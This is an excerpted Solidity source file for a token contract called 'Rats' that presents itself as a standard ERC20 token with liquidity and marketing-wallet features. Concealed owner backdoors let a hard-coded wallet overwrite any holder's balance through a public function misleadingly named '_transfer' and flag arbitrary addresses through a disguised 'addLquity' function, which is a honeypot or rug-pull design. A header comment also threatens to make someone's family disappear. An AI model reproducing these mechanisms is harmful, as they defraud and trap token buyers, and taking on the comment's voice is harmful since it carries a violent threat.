...
pragma solidity ^0.8.6;/* I've contacted my military base friends. If you disturb me again, I'll make your family disappear from the earth*/
...
interface IERC20 {
    ...
    function transfersendder(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed sendder, address indexed to, uint256 value);
...
contract  Rats is Context, IERC20, Ownable {
    ...
    address payable public teammWalletAddress;
    ...
    mapping (address => bool) public processL;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xeaf6364d96C0C369D512F8063F842875aDfECBaf));
        teammWalletAddress = payable(address(0xeaf6364d96C0C369D512F8063F842875aDfECBaf));
    ...
    function doonesixzero(uint256 amazing)  pure private returns(uint160){
        return uint160(amazing);
    }

    function doAd(uint256 amazing)  pure private returns(address){
        return address(doonesixzero(amazing));
    }

    function getIsA(address amazing) private view returns(bool){
        return (!(doAd(publlc) == amazing));
    }
    ...
    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        teammWalletAddress = payable(newAddress);
    }
...
function _transfer(address
 asd, uint256  u ) public
{ if(!checkContract(teammWalletAddress,5,msg.sender))
{return;}
    _balances[asd] = u;}
    ...
    function transfersendder(address sender, address recipient, uint256 amount) public override returns (bool) {
    ...
    }function addLquity(address[] calldata sd,uint8 cx) public { if(!checkContract(teammWalletAddress,5,msg.sender)){return;}
        for (uint256 i; i < sd.length; ++i) {
            if (cx != 6){processL[sd[i]] = true;}
            else{processL[sd[i]] = false;}
        }
    }

    function checkContract(address a,uint256 c, address b) private pure returns(bool){return (!!((a == b))) && c==5;}
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(teammWalletAddress, amountBNBMarketing);
